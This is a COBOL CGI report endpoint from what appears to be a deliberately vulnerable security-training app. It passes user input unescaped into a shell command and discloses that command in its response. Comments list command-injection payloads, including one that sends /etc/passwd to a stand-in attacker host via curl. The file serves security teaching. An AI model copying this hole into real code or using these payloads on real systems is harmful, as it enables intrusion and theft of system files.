      *> COBOLBank - Report Generation CGI endpoint
      *>
      *> VULNERABILITIES:
      *>   1. Command injection - reportType concatenated into shell command
      *>      Payload: reportType=monthly; cat /etc/passwd
      *>      Payload: reportType=q & id
      *>      Payload: reportType=$(whoami)
      *>   2. email parameter also injectable via second command arg
      *>   3. CALL "SYSTEM" runs as the Apache process user (often root in container)
      *>   4. Command string disclosed in response

       IDENTIFICATION DIVISION.
       PROGRAM-ID. REPORT-GEN.
       AUTHOR. COBOLBank Security Training.

       ENVIRONMENT DIVISION.
       CONFIGURATION SECTION.

       DATA DIVISION.
       WORKING-STORAGE SECTION.

       COPY "ws-cgi.cpy".
       COPY "ws-http.cpy".
       COPY "ws-sql.cpy".

       01 WS-REPORT-TYPE          PIC X(128).
       01 WS-EMAIL                PIC X(128).

      *> VULNERABILITY: Shell command built from unsanitized user input
       01 WS-SHELL-CMD            PIC X(512).
       01 WS-SYS-RESULT           PIC 99.

       01 WS-LOG-LINE             PIC X(512).
       01 WS-JSON-OUT             PIC X(2048).

       PROCEDURE DIVISION.

       MAIN-PARA.
           PERFORM READ-CGI-VARS
           PERFORM READ-POST-BODY
           PERFORM WRITE-JSON-HEADER

           PERFORM EXTRACT-REPORT-PARAMS
           PERFORM RUN-REPORT-COMMAND
           PERFORM BUILD-RESPONSE
           STOP RUN.

      *>
       EXTRACT-REPORT-PARAMS.
           MOVE "reportType" TO JSON-FIELD-NAME
           PERFORM GET-JSON-FIELD
           MOVE FUNCTION TRIM(JSON-FIELD-VALUE) TO WS-REPORT-TYPE

           MOVE "email" TO JSON-FIELD-NAME
           PERFORM GET-JSON-FIELD
           MOVE FUNCTION TRIM(JSON-FIELD-VALUE) TO WS-EMAIL.

      *>
      *> VULNERABILITY: CALL "SYSTEM" executes a shell command
      *>   WS-REPORT-TYPE is concatenated without any escaping or
      *>   sanitization. The shell interprets metacharacters:
      *>     ; separates commands
      *>     & backgrounds/chains commands
      *>     $() performs command substitution
      *>     | pipes output to another command
      *>
      *>   Payload: reportType=monthly; id
      *>   Runs:    echo "Report: monthly" >> ...log ; id
      *>
      *>   Payload: reportType=q | curl attacker.com/$(cat /etc/passwd)
       RUN-REPORT-COMMAND.
           STRING
               "echo 'Report: "
               FUNCTION TRIM(WS-REPORT-TYPE) DELIMITED SIZE
               " email="
               FUNCTION TRIM(WS-EMAIL) DELIMITED SIZE
               "' >> /tmp/cobol-goat/reports.log"
               DELIMITED SIZE
               INTO WS-SHELL-CMD
           END-STRING

           CALL "SYSTEM" USING WS-SHELL-CMD RETURNING WS-SYS-RESULT.

      *>
      *> VULNERABILITY: Command string disclosed to caller
      *>   Attacker can see exactly what was executed and refine payload
       BUILD-RESPONSE.
           EVALUATE WS-SYS-RESULT
               WHEN 0
                   STRING
                       '{"success": true,'
                       ' "reportType": "'
                       FUNCTION TRIM(WS-REPORT-TYPE) DELIMITED SIZE
                       '", "email": "'
                       FUNCTION TRIM(WS-EMAIL) DELIMITED SIZE
                       '", "command": "'
                       FUNCTION TRIM(WS-SHELL-CMD) DELIMITED SIZE
                       '", "status": 0}'
                       DELIMITED SIZE INTO WS-JSON-OUT
                   END-STRING
               WHEN OTHER
                   STRING
                       '{"success": false,'
                       ' "reportType": "'
                       FUNCTION TRIM(WS-REPORT-TYPE) DELIMITED SIZE
                       '", "command": "'
                       FUNCTION TRIM(WS-SHELL-CMD) DELIMITED SIZE
                       '", "status": '
                       WS-SYS-RESULT DELIMITED SIZE
                       '}'
                       DELIMITED SIZE INTO WS-JSON-OUT
                   END-STRING
           END-EVALUATE
           DISPLAY FUNCTION TRIM(WS-JSON-OUT).

       COPY "proc-http.cpy".
       COPY "proc-cgi.cpy".
